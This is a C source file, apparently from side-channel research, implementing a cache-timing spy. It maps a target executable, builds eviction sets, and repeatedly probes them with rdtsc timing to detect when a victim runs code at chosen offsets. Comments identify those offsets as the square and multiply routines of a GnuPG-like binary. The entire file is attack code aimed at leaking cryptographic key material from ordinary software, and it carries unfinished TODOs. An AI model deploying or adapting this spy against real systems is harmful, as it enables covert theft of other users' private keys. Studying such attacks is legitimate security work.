#include "evset-timings.c"
#include <sys/stat.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <x86intrin.h>
#include <errno.h>

static Node **spy_evsets = NULL;
static void *victim;
// static int map_len;
uint64_t *msrmts_spy;

void *map(char *file_name, uint64_t offset)
{
    int file_descriptor = open(file_name, O_RDONLY); 
    if (file_descriptor == -1) return NULL;
    struct stat st_buf;
    if (fstat(file_descriptor, &st_buf) == -1) return NULL;
    size_t map_len = st_buf.st_size;
	void *mapping = mmap(NULL, map_len, PROT_READ, MAP_PRIVATE, file_descriptor, 0);
	if (mapping == MAP_FAILED){
		printf("mmap fail with errno %d\n", errno); // fix problems with mmap
		return NULL;
	}
	close(file_descriptor);
	return (void *)(((uint64_t) mapping) + offset);  // mapping will be implicitly unmapped when calling function will be exited
}

// TODO load addresses from file

void init_spy(char *target_filepath, int offset_target){
    printf("init spy\n");
    // load victim 
    // victim_reader(target_filepath);
    victim = map(target_filepath, offset_target);
    printf("victim read\n");

    // prepare evset
    Config *spy_conf= config_init(24, 2048, 64, 1965, 2097152, 1, 1);
    init_evset(spy_conf);
    printf("init evset done\n");
    spy_evsets = find_evset(spy_conf, victim);
    printf("find evset done\n");
    
    printf("[+] spy evset for target adrs %p\n", victim);
    list_print(spy_evsets);

    msrmts_spy = malloc(1000000*sizeof(uint64_t));
}

uint64_t my_detect(void *spy_target){
    my_access(spy_target+222);   
    uint64_t probe = probe_chase_loop(spy_target, conf->evset_size);
    // traverse_list0(*spy_evsets); // TODO find out threshold
    return probe;       
}

static __inline__ unsigned long long rdtsc(void)
{
    unsigned long long int x;
    __asm__ __volatile__ ("rdtsc" : "=A" (x));
    return x;
}

void my_monitor(void *spy_target){
    int ctr =0;
    unsigned long long old_tsc, tsc = rdtsc();
    traverse_list0(*spy_evsets);
    while(1)
    {
        old_tsc = tsc;
        tsc=rdtsc();
        while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
        {
            tsc = rdtsc();
        }
        msrmts_spy[ctr]= my_detect(spy_target);
        
        if(msrmts_spy[ctr] < conf->threshold) {
            printf("[!] victim acitivity detected! cycles %lu, ctr %d\n", msrmts_spy[ctr], ctr);
        }
        ctr++;
        if(ctr >= 1000000) ctr=0;
    }
    
    for(int i=0;i<100000;i++) printf("%lu; ", msrmts_spy[i]);
    printf("\n ctr %d \n", ctr);
}

void spy(char *victim_filepath, int offset_target){
    init_spy(victim_filepath, offset_target);
    printf("[+] spy init complete, monitoring %p now...\n", victim);
    void **test_print = (void **)victim;
    printf("%p\n", *test_print);
    my_monitor(victim);
}

int main(int ac, char **av){  
    printf("%s\n", av[1]); // first char file path
    printf("%s\n", av[2]); // second file path later, rn hardcoded location 
    // int my_target = 0x15cb;
    int my_target = 0xd57ed; 
    //0x15a2-0x1a0a victim_loop2, loop itself 0x15be - 0x15e6 alder lake
    //0xd57ed madgpg sqr, 0xd571f mul
    // my_access(my_target);
    printf("%d\n", my_target);
    // printf("%p\n", target_loader(av[2]));
    spy(av[1], my_target);
}